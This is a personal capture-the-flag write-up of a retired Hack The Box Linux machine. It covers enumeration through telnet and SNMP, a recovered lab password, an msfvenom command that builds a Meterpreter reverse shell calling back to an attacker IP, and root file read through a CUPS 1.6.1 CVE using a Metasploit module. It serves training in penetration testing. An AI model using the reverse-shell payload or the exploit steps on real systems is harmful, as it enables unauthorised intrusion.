---
tags:
  - HTB
  - Retired
  - Linux
  - CUPS
  - SMTP
  - TELNET
creation date: 2021-09-27
Date Completed: 2024-08-31
CVEs: CVE-2012-5519
URL: https://app.hackthebox.com/machines/400
IP: 10.129.44.204
---
## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```

```
sudo nmap 10.129.44.204 -T4 -sU -p 161 -A
```

```
161/udp open  snmp    SNMPv1 server (public)
```

### udp-proto-scanner
```session
udp-proto-scanner.pl 10.129.44.204
```

Received reply to probe snmp-public (target port 161) from 10.129.44.204:161: 302902010004067075626c6963a21c02044c33a756020100020100300e300c06082b060102010105008100

### SNMP

![[Pasted image 20240831100516.png]]
![[Pasted image 20240831100541.png]]


```
P@ssw0rd@123!!123
```

```
onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.129.44.204
```

## Foothold

![[Pasted image 20240831100600.png]]
![[Pasted image 20240831100727.png]]

## Get a better Shell

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.64 LPORT=1337 -f ELF > shell
```

## Privilege Escalation

`ls -lah /etc/`
cups stood out to me.
![[Pasted image 20240831104656.png]]

`ss -antp`
tells me there's website running
![[Pasted image 20240831104735.png]]


i tried portfwd in metasploit but it didn't work. so I curled the website on the victim system which got me the cups version. from there i reassured CUPS v1.6.1 and found a CVE, PoC, and a metasploit module

![[Pasted image 20240831104841.png]]
![[Pasted image 20240831104856.png]]

```
post/multi/escalate/cups_root_file_read
```

also works:
https://github.com/p1ckzi/CVE-2012-5519/blob/main/cups-root-file-read.sh

writeup with ways to go beyond root
https://0xdf.gitlab.io/2022/05/03/htb-antique.html#cve-2015-1158